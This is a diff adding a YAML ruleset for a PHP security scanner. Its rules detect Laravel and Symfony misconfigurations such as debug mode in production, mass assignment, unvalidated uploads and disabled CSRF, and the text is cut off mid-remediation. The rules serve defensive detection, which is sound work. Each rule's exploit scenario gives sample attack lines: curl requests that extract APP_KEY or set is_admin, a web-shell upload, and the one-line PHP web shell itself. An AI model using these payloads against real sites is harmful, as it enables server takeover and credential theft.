@@ -1,0 +1,1043 @@
+rules:
+- rule_id: FW-LARAVEL-001
+  title: Laravel APP_DEBUG=true in Production Environment
+  description: 'Detects Laravel applications with APP_DEBUG set to true in production configuration. When debug mode is enabled, Laravel displays detailed error pages via Ignition or Whoops, revealing full
+    stack traces, database queries with parameters, environment variables (including APP_KEY, database passwords, API secrets), and the complete application configuration. This has historically led to critical
+    RCE vulnerabilities such as CVE-2021-3129 (Ignition RCE).
+
+    '
+  language: php
+  category: framework_misuse
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-489
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - laravel
+  - debug
+  - information-disclosure
+  - rce
+  - misconfiguration
+  - php
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: APP_DEBUG\s*=\s*true
+    description: APP_DEBUG set to true in .env or config
+  - type: regex
+    pattern: '''debug''\s*=>\s*true'
+    description: Debug set to true in config/app.php
+  - type: regex
+    pattern: '''debug''\s*=>\s*env\s*\(\s*''APP_DEBUG''\s*,\s*true\s*\)'
+    description: Debug defaulting to true when APP_DEBUG not set
+  - type: regex
+    pattern: config\s*\(\s*\[\s*["\x27]app\.debug["\x27]\s*=>\s*true\s*\]\s*\)
+    description: Debug set via config helper
+  - type: regex
+    pattern: APP_ENV\s*=\s*local
+    description: App environment set to local in production
+  - type: regex
+    pattern: '''debug''\s*=>\s*\(bool\)\s*env\s*\(\s*''APP_DEBUG''\s*,\s*true\s*\)'
+    description: Debug with boolean cast defaulting to true
+  anti_patterns:
+  - APP_DEBUG\s*=\s*false
+  - '''debug''\s*=>\s*false'
+  - '''debug''\s*=>\s*env\s*\(\s*''APP_DEBUG''\s*,\s*false\s*\)'
+  - APP_ENV\s*=\s*production
+  - APP_ENV\s*=\s*staging
+  - Handler.*report\s*\(
+  - register\s*\(\s*\)[\s\S]*?reportable
+  - LOG_CHANNEL\s*=\s*stack
+  - php artisan config:cache
+  - Sentry::captureException
+  - Bugsnag
+  - app\.debug.*config:cache
+  - '''debug''\s*=>\s*\(bool\)\s*env\s*\(\s*''APP_DEBUG''\s*,\s*false\s*\)'
+  - flare\s*\(\s*\)[\s\S]*?productionMode
+  - APP_DEBUG\s*=\s*""
+  bypass_variants:
+  - description: Debug mode disabled but Telescope installed without auth gate
+    pattern: TelescopeServiceProvider(?![\s\S]*?gate\s*\(\s*\))
+  - description: .env.production overridden by .env file in deployment
+    pattern: APP_DEBUG\s*=\s*false[\s\S]*?\.env[\s\S]*?APP_DEBUG\s*=\s*true
+  - description: Debug mode off but log viewer accessible publicly
+    pattern: Route::get\s*\(\s*["\x27]logs["\x27][\s\S]*?LogViewer
+  evasion_indicators:
+  - .env file deployed with debug=true from development
+  - Docker environment variable overriding .env file setting
+  - Ignition debug page accessible even with APP_DEBUG=false due to cached config
+  encoding_variants:
+  - type: quoted_bool
+    pattern: APP_DEBUG\s*=\s*["']true["']
+  - type: numeric_bool
+    pattern: APP_DEBUG\s*=\s*1
+  multi_function_chain_patterns:
+  - APP_DEBUG=true -> exception thrown -> Ignition debug page -> env vars with APP_KEY leaked
+  - APP_DEBUG=true -> CVE-2021-3129 -> Ignition RCE -> server compromise
+  - APP_DEBUG=true -> database error -> full SQL query with parameters exposed
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Debug page reveals APP_KEY enabling session forgery and encryption bypass
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Any HTTP request that triggers an exception
+    sink: Ignition/Whoops debug error page
+    through: Laravel exception handler in debug mode
+  impact: 'Laravel debug mode in production exposes APP_KEY (allowing session
+
+    forgery and encryption bypass), database credentials, mail server
+
+    passwords, third-party API keys, and full application source code
+
+    via stack traces. The Ignition debug page has historically been
+
+    exploitable for RCE (CVE-2021-3129). An exposed APP_KEY alone allows
+
+    attackers to forge session cookies and decrypt all application data.
+
+    '
+  remediation: "Ensure debug mode is disabled in production:\n\n```bash\n# .env (production)\nAPP_ENV=production\nAPP_DEBUG=false\n```\n\n```php\n// config/app.php\n'debug' => (bool) env('APP_DEBUG', false),\n\
+    \n// Disable Ignition in production\n// composer remove facade/ignition --no-dev\n\n// Use proper error reporting\n// app/Exceptions/Handler.php\npublic function register()\n{\n    $this->reportable(function\
+    \ (Throwable $e) {\n        if (app()->bound('sentry')) {\n            app('sentry')->captureException($e);\n        }\n    });\n}\n```\n"
+  references:
+  - https://laravel.com/docs/configuration#debug-mode
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129
+  - https://cwe.mitre.org/data/definitions/489.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - APP_DEBUG
+    - APP_ENV
+    - APP_KEY
+    - config/app\.php
+    taint_source_indicators:
+    - request\s*\(\s*\)
+    - \$request->
+    - Input::get
+    taint_sink_indicators:
+    - throw\s+new
+    - abort\s*\(
+    - dd\s*\(
+    sanitization_patterns:
+    - APP_DEBUG\s*=\s*false
+    - APP_ENV\s*=\s*production
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: 'severity_weight * confidence * (ignition_installed ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker sends a malformed request to a Laravel application with
+
+      APP_DEBUG=true. The Ignition debug page renders, revealing the
+
+      APP_KEY, database credentials, and AWS access keys. Using the
+
+      APP_KEY, the attacker forges a session cookie with admin privileges.
+
+      If Ignition version is vulnerable to CVE-2021-3129, the attacker
+
+      achieves RCE through the debug page''s file manipulation features.
+
+      '
+    example_payload: 'curl ''https://target.com/api/nonexistent'' -H ''Accept: text/html'' | grep APP_KEY'
+    attacker_objective: Extract sensitive env vars and credentials from Laravel debug page; exploit Ignition RCE
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: low
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-LARAVEL-002
+    - FW-LARAVEL-003
+    - FW-FLASK-001
+    - FW-DJANGO-001
+    - FW-SYMFONY-001
+- rule_id: FW-LARAVEL-002
+  title: Laravel Mass Assignment Without Fillable or Guarded
+  description: 'Detects Laravel Eloquent models that accept mass assignment without defining $fillable or $guarded properties. Without these protections, attackers can modify any database column through
+    request input, including fields like is_admin, role, password, balance, and owner_id. Models with $guarded = [] (empty array) are also vulnerable as they explicitly disable all protection.
+
+    '
+  language: php
+  category: framework_misuse
+  severity: High
+  confidence: 0.91
+  cwe: CWE-915
+  owasp: A04:2021-Insecure Design
+  tags:
+  - laravel
+  - eloquent
+  - mass-assignment
+  - model
+  - authorization
+  - php
+  detection_layer: 4
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: class\s+\w+\s+extends\s+Model\s*\{(?![\s\S]*?\$(?:fillable|guarded))
+    description: Eloquent model without $fillable or $guarded defined
+  - type: regex
+    pattern: protected\s+\$guarded\s*=\s*\[\s*\]
+    description: Guarded set to empty array (no protection)
+  - type: regex
+    pattern: '[a-zA-Z_]\w{0,60}::create\s*\(\s*\$request->all\s*\(\s*\)\s*\)'
+    description: Mass assignment from all request data
+  - type: regex
+    pattern: '[a-zA-Z_]\w{0,60}::create\s*\(\s*request\s*\(\s*\)->all\s*\(\s*\)\s*\)'
+    description: Create from all request helper data
+  - type: regex
+    pattern: \$\w+->fill\s*\(\s*\$request->all\s*\(\s*\)\s*\)
+    description: Fill model with all request data
+  - type: regex
+    pattern: \$\w+->update\s*\(\s*\$request->all\s*\(\s*\)\s*\)
+    description: Update model with all request data
+  - type: regex
+    pattern: '[a-zA-Z_]\w{0,60}::create\s*\(\s*\$request->input\s*\(\s*\)\s*\)'
+    description: Create from all request input
+  - type: regex
+    pattern: Model::unguard\s*\(\s*\)
+    description: Global model guard disabled
+  anti_patterns:
+  - protected\s+\$fillable\s*=\s*\[
+  - protected\s+\$guarded\s*=\s*\[\s*["\x27]
+  - \$request->only\s*\(
+  - \$request->validated\s*\(\s*\)
+  - \$request->safe\s*\(\s*\)
+  - validate\s*\(\s*\$request
+  - \$request->except\s*\(
+  - FormRequest
+  - StoreRequest
+  - UpdateRequest
+  - \$validated\s*=\s*\$request->validate
+  - new\s+\w+\s*;\s*\$\w+->\w+\s*=
+  - Model::preventSilentlyDiscardingAttributes
+  - shouldBeStrict
+  - \$request->permit\s*\(
+  bypass_variants:
+  - description: $fillable defined but includes sensitive fields
+    pattern: \$fillable\s*=\s*\[[^\]]*['"](?:is_admin|role|password|balance)['"]
+  - description: Form request validation passes but mass assigns validated data
+    pattern: \\$request->validated\s*\(\s*\)[\s\S]*?::create(?![\s\S]*?\\$fillable)
+  - description: Guarded protects some fields but not all sensitive ones
+    pattern: \$guarded\s*=\s*\[\s*['"]id['"]\s*\]
+  evasion_indicators:
+  - Model $fillable defined in trait but overridden in model
+  - Dynamic $fillable modified at runtime based on user role
+  - Model::unguard() called in seeder but seeder code accessible in prod
+  encoding_variants:
+  - type: json_fields
+    pattern: \$request->json\s*\(\s*\)->all\s*\(\s*\)
+  - type: merge_extra
+    pattern: \$request->merge\s*\(\s*\[[\s\S]*?\]\s*\)->all\s*\(\s*\)
+  multi_function_chain_patterns:
+  - request()->all() -> Model::create() -> is_admin=true saved to DB
+  - $request->all() -> $model->fill() -> save() -> role/privilege modified
+  - Model::unguard() -> factory/seeder -> guard not re-enabled -> mass assignment in requests
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: true
+    escalation_vector: Mass assignment enables privilege escalation by setting admin/role fields
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: false
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: HTTP request data ($request->all())
+    sink: Eloquent Model::create() or $model->fill()
+    through: Controller without $fillable/$guarded protection
+  impact: 'Without mass assignment protection, attackers can set any column in
+
+    the database by including extra fields in their request. Common
+
+    exploits include setting is_admin=true for privilege escalation,
+
+    modifying price/balance for financial fraud, changing owner_id for
+
+    resource theft, and setting verification flags to bypass checks.
+
+    Laravel''s Eloquent ORM processes all provided fields by default.
+
+    '
+  remediation: "Define $fillable on all Eloquent models and use validated input:\n\n```php\n// app/Models/User.php\nclass User extends Model\n{\n    // Whitelist approach (preferred)\n    protected $fillable\
+    \ = [\n        'name',\n        'email',\n        'password',\n    ];\n\n    // OR blacklist approach\n    // protected $guarded = ['id', 'is_admin', 'role', 'balance'];\n}\n\n// In Controller - use\
+    \ Form Request validation\npublic function store(StoreUserRequest $request)\n{\n    // Only validated fields are used\n    User::create($request->validated());\n}\n\n// Enable strict mode to catch issues\n\
+    // AppServiceProvider.php\nModel::shouldBeStrict(!app()->isProduction());\n```\n"
+  references:
+  - https://laravel.com/docs/eloquent#mass-assignment
+  - https://cwe.mitre.org/data/definitions/915.html
+  - https://owasp.org/Top10/A04_2021-Insecure_Design/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - extends\s+Model
+    - ::create\s*\(
+    - ->fill\s*\(
+    - ->update\s*\(
+    taint_source_indicators:
+    - \$request->all\s*\(\s*\)
+    - \$request->input\s*\(\s*\)
+    - request\s*\(\s*\)->all
+    taint_sink_indicators:
+    - ::create\s*\(
+    - ->fill\s*\(
+    - ->update\s*\(
+    - ->save\s*\(
+    sanitization_patterns:
+    - \$request->only\s*\(
+    - \$request->validated\s*\(\s*\)
+    - \$fillable\s*=
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (sensitive_columns_present ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Laravel API has a user registration endpoint that calls
+
+      User::create($request->all()). The User model has $guarded = [].
+
+      An attacker sends a registration request with an extra field:
+
+      {"name":"Evil","email":"evil@test.com","password":"pass123",
+
+      "is_admin":true}. The is_admin field is saved to the database,
+
+      granting the attacker administrator privileges immediately.
+
+      '
+    example_payload: 'curl -X POST https://target.com/api/register -H "Content-Type: application/json" -d "{\"name\":\"attacker\",\"email\":\"a@b.com\",\"password\":\"pass\",\"is_admin\":true}"'
+    attacker_objective: Modify protected model attributes through mass assignment to escalate privileges
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-LARAVEL-001
+    - FW-LARAVEL-003
+    - FW-ASPNET-006
+- rule_id: FW-LARAVEL-003
+  title: Unvalidated File Upload in Laravel
+  description: 'Detects Laravel controllers that handle file uploads without proper validation of file type, MIME type, size, and content. Laravel''s request file handling stores uploaded files without
+    restriction unless validation rules are explicitly applied. Missing validation enables attackers to upload PHP web shells, bypass file type restrictions using double extensions, and exploit path traversal
+    vulnerabilities.
+
+    '
+  language: php
+  category: framework_misuse
+  severity: Medium
+  confidence: 0.82
+  cwe: CWE-434
+  owasp: A04:2021-Insecure Design
+  tags:
+  - laravel
+  - file-upload
+  - web-shell
+  - validation
+  - rce
+  - php
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: \$request->file\s*\(\s*["\x27]\w+["\x27]\s*\)->store\s*\(
+    description: File stored without prior validation
+  - type: regex
+    pattern: \$request->file\s*\(\s*["\x27]\w+["\x27]\s*\)->storeAs\s*\(
+    description: File stored with custom name without validation
+  - type: regex
+    pattern: \$request->\w+->move\s*\(
+    description: File moved without validation
+  - type: regex
+    pattern: \$request->\w+->storePublicly\s*\(
+    description: File stored publicly without validation
+  - type: regex
+    pattern: Storage::put\s*\(\s*[^,]+,\s*\$request->file
+    description: Storage facade with unvalidated file
+  - type: regex
+    pattern: \$request->\w+->getClientOriginalName\s*\(\s*\)
+    description: Using original client filename (path traversal risk)
+  - type: regex
+    pattern: move_uploaded_file\s*\(\s*\$_FILES
+    description: Raw PHP file upload without Laravel validation
+  - type: regex
+    pattern: \$request->file\s*\(\s*["\x27]\w+["\x27]\s*\)->storeAs\s*\([^,]+,\s*\$request
+    description: storeAs using user-provided filename
+  anti_patterns:
+  - \$request->validate\s*\(\s*\[[\s\S]*?["\x27]\w+["\x27]\s*=>\s*["\x27][^"]*file
+  - '\$request->validate\s*\(\s*\[[\s\S]*?["\x27]\w+["\x27]\s*=>\s*["\x27][^"]*mimes:'
+  - \$request->validate\s*\(\s*\[[\s\S]*?["\x27]\w+["\x27]\s*=>\s*["\x27][^"]*image
+  - mimes:jpg,jpeg,png,gif
+  - mimetypes:image/
+  - max:\d+
+  - 'dimensions:'
+  - FormRequest
+  - StoreRequest.*rules
+  - Validator::make
+  - \$this->validate\s*\(
+  - getClientMimeType\s*\(\s*\)\s*===?\s*["\x27]image
+  - str_contains.*getClientOriginalExtension
+  - hashName\s*\(\s*\)
+  - Str::uuid\s*\(\s*\)
+  bypass_variants:
+  - description: Validation checks extension but not MIME type
+    pattern: validate[\s\S]*?mimes:\w+(?![\s\S]*?mimetypes:)
+  - description: File stored in public directory accessible via web
+    pattern: ->store\s*\(\s*['"]public
+  - description: File validation present but allows PHP files
+    pattern: mimes:[^'"]*php
+  evasion_indicators:
+  - Double extension bypass (file.php.jpg)
+  - MIME type spoofing to bypass mimes validation
+  - Null byte injection in filename for path traversal
+  encoding_variants:
+  - type: double_extension
+    pattern: getClientOriginalName[\s\S]*?\.(php|phtml|phar)\.
+  - type: content_type_spoof
+    pattern: Content-Type:\s*image/jpeg[\s\S]*?<\?php
+  multi_function_chain_patterns:
+  - $request->file('avatar') -> store('public/avatars') -> PHP shell in web root
+  - $request->file('doc') -> storeAs(path, originalName) -> path traversal
+  - move_uploaded_file -> public_path() -> web-accessible PHP shell
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: File upload enables web shell deployment and remote code execution
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $request->file() uploaded file
+    sink: Storage::put() or ->store() to disk
+    through: Controller without validation rules
+  impact: 'Unvalidated file uploads allow attackers to upload PHP web shells
+
+    that execute arbitrary commands on the server. If files are stored
+
+    in web-accessible directories (public/), the attacker can execute
+
+    the uploaded PHP file directly. Without filename sanitization, path
+
+    traversal attacks can overwrite critical files. Without size limits,
+
+    attackers can exhaust disk space.
+
+    '
+  remediation: "Validate all uploaded files with Laravel validation rules:\n\n```php\n// Using Form Request (preferred)\nclass UploadRequest extends FormRequest\n{\n    public function rules()\n    {\n\
+    \        return [\n            'file' => [\n                'required',\n                'file',\n                'mimes:jpg,jpeg,png,gif,pdf',\n                'mimetypes:image/jpeg,image/png,image/gif,application/pdf',\n\
+    \                'max:5120', // 5MB\n            ],\n        ];\n    }\n}\n\n// In Controller\npublic function upload(UploadRequest $request)\n{\n    $file = $request->file('file');\n    // Always use\
+    \ hashName, never client name\n    $path = $file->storeAs(\n        'uploads',\n        $file->hashName(), // UUID-based name\n        'private'          // Not web-accessible\n    );\n    return response()->json(['path'\
+    \ => $path]);\n}\n```\n"
+  references:
+  - https://laravel.com/docs/validation#rule-file
+  - https://laravel.com/docs/filesystem#file-uploads
+  - https://cwe.mitre.org/data/definitions/434.html
+  - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  context_awareness:
+    surrounding_context_patterns:
+    - \$request->file\s*\(
+    - ->store\s*\(
+    - ->storeAs\s*\(
+    - 'Storage::'
+    taint_source_indicators:
+    - \$request->file\s*\(
+    - \$_FILES
+    - getClientOriginalName
+    taint_sink_indicators:
+    - ->store\s*\(
+    - ->storeAs\s*\(
+    - Storage::put\s*\(
+    - move\s*\(
+    sanitization_patterns:
+    - 'validate[\s\S]*?mimes:'
+    - validate[\s\S]*?image
+    - hashName\s*\(\s*\)
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (public_storage ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Laravel application has a profile picture upload without validation.
+
+      An attacker uploads a file named ''shell.php'' containing:
+
+      <?php system($_GET[''cmd'']); ?>. The file is stored in
+
+      storage/app/public/avatars/shell.php and is accessible via the
+
+      public symlink. The attacker accesses
+
+      https://target.com/storage/avatars/shell.php?cmd=id
+
+      to execute arbitrary commands on the server.
+
+      '
+    example_payload: curl -X POST https://target.com/api/upload -F 'avatar=@shell.php;type=image/jpeg'
+    attacker_objective: Upload PHP web shell to achieve remote code execution on the server
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-LARAVEL-001
+    - FW-LARAVEL-002
+    - FW-FLASK-004
+- rule_id: FW-SYMFONY-001
+  title: Symfony Debug Mode Enabled in Production
+  description: 'Detects Symfony applications that run with kernel.debug set to true or the Symfony Web Profiler and Debug Toolbar enabled in production. The debug mode exposes the Web Profiler which reveals
+    detailed request and response information, database queries, security context, services container, and environment variables. The debug toolbar provides real-time introspection of every request component.
+
+    '
+  language: php
+  category: framework_misuse
+  severity: Medium
+  confidence: 0.87
+  cwe: CWE-489
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - symfony
+  - debug
+  - web-profiler
+  - information-disclosure
+  - misconfiguration
+  - php
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: new\s+\w*Kernel\s*\(\s*['"]prod['"]\s*,\s*true\s*\)
+    description: Symfony kernel with debug=true in production
+  - type: regex
+    pattern: APP_DEBUG\s*=\s*1
+    description: APP_DEBUG set to 1 in environment
+  - type: regex
+    pattern: APP_DEBUG\s*=\s*true
+    description: APP_DEBUG set to true
+  - type: regex
+    pattern: '''kernel\.debug''\s*=>\s*true'
+    description: kernel.debug parameter set to true
+  - type: regex
+    pattern: when@prod:[\s\S]*?web_profiler:\s*\n\s*toolbar:\s*true
+    description: Web profiler enabled in production configuration
+  - type: regex
+    pattern: framework:\s*\n\s*profiler:\s*\n\s*enabled:\s*true
+    description: Profiler enabled in framework configuration
+  - type: regex
+    pattern: Debug::enable\s*\(\s*\)
+    description: Symfony Debug component explicitly enabled
+  - type: regex
+    pattern: web_profiler:\s*\n\s*toolbar:\s*true\s*\n\s*intercept_redirects:\s*true
+    description: Full web profiler with redirect interception
+  anti_patterns:
+  - new\s+\w*Kernel\s*\(\s*['"]prod['"]\s*,\s*false\s*\)
+  - APP_DEBUG\s*=\s*0
+  - APP_DEBUG\s*=\s*false
+  - '''kernel\.debug''\s*=>\s*false'
+  - when@prod:[\s\S]*?web_profiler:\s*\n\s*toolbar:\s*false
+  - APP_ENV\s*=\s*prod
+  - profiler:\s*\n\s*enabled:\s*false
+  - framework:\s*\n\s*profiler:\s*\n\s*collect:\s*false
+  - config/packages/prod/
+  - when@prod:[\s\S]*?profiler:\s*false
+  - kernel\.debug.*%env
+  - monolog.*sentry
+  - ErrorHandler::register
+  - config_prod\.yml
+  - productionErrorHandler
+  bypass_variants:
+  - description: Debug disabled but profiler still collecting in production
+    pattern: APP_DEBUG\s*=\s*0[\s\S]*?profiler:\s*\n\s*enabled:\s*true
+  - description: Debug routes accessible without authentication
+    pattern: _profiler:\s*\n\s*resource:.*WebProfilerBundle(?![\s\S]*?access_control)
+  - description: Debug mode off but VarDumper server enabled
+    pattern: var_dumper:\s*\n\s*server_dump_url
+  evasion_indicators:
+  - Environment variable APP_DEBUG overridden at server level
+  - Cached container built with debug=true and not cleared
+  - Development .env overriding production settings
+  encoding_variants:
+  - type: env_file
+    pattern: APP_DEBUG\s*=\s*["\x27]?1["\x27]?
+  - type: config_param
+    pattern: parameters:\s*\n\s*kernel\.debug:\s*true
+  multi_function_chain_patterns:
+  - APP_DEBUG=1 -> /_profiler -> request data, session, security context exposed
+  - kernel.debug=true -> exception -> full stack trace with source code
+  - web_profiler.toolbar=true -> every response -> debug info in HTML
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Profiler reveals security tokens, session data, and service configuration
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Any HTTP request
+    sink: Web Profiler interface at /_profiler/
+    through: Debug mode enabling profiler data collection
+  impact: 'Symfony debug mode in production exposes the Web Profiler at /_profiler/
+
+    which reveals complete request/response details, database queries with
+
+    parameters, security token contents, logged-in user details, service
+
+    container configuration, environment variables, and mail contents.
+
+    Detailed exception pages reveal source code, file paths, and the full
+
+    call stack with local variables.
+
+    '
+  remediation: "Ensure debug mode is disabled in production:\n\n```bash\n# .env.local (or server environment)\nAPP_ENV=prod\nAPP_DEBUG=0\n```\n\n```yaml\n# config/packages/prod/web_profiler.yaml\nweb_profiler:\n\
+    \    toolbar: false\n    intercept_redirects: false\nframework:\n    profiler:\n        enabled: false\n        collect: false\n```\n\n```php\n// public/index.php\n$kernel = new Kernel(\n    $_SERVER['APP_ENV']\
+    \ ?? 'prod',\n    (bool) ($_SERVER['APP_DEBUG'] ?? false)\n);\n```\n"
+  references:
+  - https://symfony.com/doc/current/configuration.html#debug-mode
+  - https://symfony.com/doc/current/profiler.html
+  - https://cwe.mitre.org/data/definitions/489.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - APP_DEBUG
+    - kernel\.debug
+    - web_profiler
+    - Kernel\s*\(
+    taint_source_indicators:
+    - \$request->query
+    - \$request->request
+    - \$request->getContent
+    taint_sink_indicators:
+    - Debug::enable
+    - profiler.*enabled.*true
+    sanitization_patterns:
+    - APP_DEBUG\s*=\s*0
+    - APP_ENV\s*=\s*prod
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: 'severity_weight * confidence * (profiler_accessible ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker discovers that a Symfony application has the Web Profiler
+
+      enabled in production by accessing /_profiler/. They browse recent
+
+      profiler tokens to find requests containing authentication tokens,
+
+      database queries revealing table structures and sensitive data,
+
+      and environment variables including database credentials and API
+
+      keys. Using the database credentials, the attacker connects to
+
+      the production database directly.
+
+      '
+    example_payload: curl https://target.com/_profiler/latest?panel=config
+    attacker_objective: Access the Symfony Web Profiler to extract credentials, tokens, and application internals
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: low
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-SYMFONY-002
+    - FW-SYMFONY-003
+    - FW-LARAVEL-001
+    - FW-FLASK-001
+- rule_id: FW-SYMFONY-002
+  title: Missing CSRF Token Validation in Symfony Forms
+  description: 'Detects Symfony applications where CSRF protection is disabled on forms or controllers that handle state-changing operations. Symfony provides built-in CSRF protection through the CsrfExtension
+    and CSRF token manager, but this protection must be explicitly enabled or can be accidentally disabled through form configuration or missing annotations.
+
+    '
+  language: php
+  category: framework_misuse
+  severity: High
+  confidence: 0.88
+  cwe: CWE-352
+  owasp: A01:2021-Broken Access Control
+  tags:
+  - symfony
+  - csrf
+  - forms
+  - security
+  - session-riding
+  - php
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: '''csrf_protection''\s*=>\s*false'
+    description: CSRF protection explicitly disabled in form options
+  - type: regex
+    pattern: csrf_protection:\s*false
+    description: CSRF protection disabled in YAML config
+  - type: regex
+    pattern: '''csrf_protection''\s*=>\s*false[\s\S]*?configureOptions'
+    description: CSRF disabled in form type configureOptions
+  - type: regex
+    pattern: framework:\s*\n\s*csrf_protection:\s*\n\s*enabled:\s*false
+    description: CSRF globally disabled in framework configuration
+  - type: regex
+    pattern: \$form\s*=\s*\$this->createFormBuilder\s*\([^)]*\)[\s\S]*?(?!csrf_protection)
+    description: Form builder without CSRF configuration
+  - type: regex
+    pattern: isCsrfTokenValid\s*\([^)]*\)\s*;\s*$
+    description: CSRF validation checked but result not used
+  - type: regex
+    pattern: '#\[Route\s*\([^)]*methods:\s*\[\s*["\x27]POST["\x27][\s\S]*?\][\s\S]*?\)\s*\]\s*\n\s*public\s+function\s+\w+\s*\(\s*Request\s+\$request(?![\s\S]*?csrf)'
+    description: POST route handler without CSRF check
+  anti_patterns:
+  - '''csrf_protection''\s*=>\s*true'
+  - csrf_protection:\s*true
+  - isCsrfTokenValid\s*\([^)]*\)\s*\)
+  - \$this->isCsrfTokenValid\s*\(
+  - CsrfTokenManagerInterface
+  - csrf_token\s*\(
+  - CsrfExtension
+  - _token
+  - csrf_protection:\s*\n\s*enabled:\s*true
+  - CsrfToken
+  - '@csrf'
+  - isCsrfTokenValid.*throw
+  - CsrfTokenManager
+  - csrf_field
+  - submitForm.*_token
+  bypass_variants:
+  - description: CSRF validation present but uses weak token ID
+    pattern: isCsrfTokenValid\s*\(\s*['"]['"]
+  - description: CSRF enabled on form but AJAX endpoints bypass validation
+    pattern: '#\[Route\([^)]*methods.*POST[^)]*\)\][\s\S]*?jsonResponse(?![\s\S]*?csrf)'
+  - description: Token validated but not regenerated after use (replay attack)
+    pattern: isCsrfTokenValid[\s\S]*?(?!.*refreshCsrfToken)
+  evasion_indicators:
+  - CSRF protection enabled globally but disabled on specific form types
+  - Custom authentication filter that skips CSRF for API routes
+  - SameSite cookie attribute relied upon instead of CSRF tokens
+  encoding_variants:
+  - type: form_option
+    pattern: setDefaults\s*\(\s*\[[\s\S]*?['"]csrf_protection['"]\s*=>\s*false
+  - type: config_override
+    pattern: when@prod:[\s\S]*?csrf_protection:\s*false
+  multi_function_chain_patterns:
+  - POST form without CSRF -> user submits form -> state changed via CSRF attack
+  - createFormBuilder() -> no csrf_protection -> form submitted cross-site
+  - CSRF globally disabled -> all forms vulnerable -> account takeover via CSRF
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: false
+    escalation_vector: CSRF enables attackers to perform actions as authenticated users
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: false
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Cross-origin form submission
+    sink: Symfony controller handling state-changing request
+    through: Disabled CSRF protection
+  impact: 'Without CSRF protection, any website can submit forms to the Symfony
+
+    application on behalf of authenticated users. Attackers craft hidden
+
+    forms that auto-submit when victims visit their page. The browser
+
+    includes the session cookie, and the application processes the request
+
+    as legitimate. This enables unauthorized transactions, data
+
+    modifications, and account changes.
+
+    '
+  remediation: "Enable and verify CSRF protection:\n\n```yaml\n# config/packages/framework.yaml\nframework:\n    csrf_protection:\n        enabled: true\n```\n\n```php\n// In Form Types\npublic function\
+    \ configureOptions(OptionsResolver $resolver)\n{\n    $resolver->setDefaults([\n        'data_class' => Entity::class,\n        'csrf_protection' => true,\n        'csrf_field_name' => '_token',\n \
